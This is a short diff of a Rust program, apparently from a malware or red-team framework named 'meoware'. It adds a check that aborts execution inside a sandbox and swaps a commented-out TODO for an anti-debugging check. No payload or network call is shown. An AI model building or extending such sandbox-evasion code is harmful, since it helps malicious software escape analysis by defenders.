@@ -1,6 +1,7 @@
 #![cfg_attr(not(any(debug_assertions, feature = "verbose")), no_std)]
 
-use meoware::core::ssn_table;
+use meoware::core::{ssn_table, sandbox};
+use meoware::debug;
 
 fn main() {
     unsafe {
@@ -8,13 +9,18 @@ fn main() {
             return;
         }
         
+        if !sandbox::is_real_environment() {
+            debug!("[SANDBOX] Environment check failed — aborting");
+            return
+        } 
+        
         /*
-            TODO: A sandbox check
-            if !sandbox::env_is_safe() {
+            TODO: Debugging check
+            if !anti_debugging::is_safe_environment() {
                 return
             } 
         */
-        
+
         meoware::core::demo::demo();
     }
 }
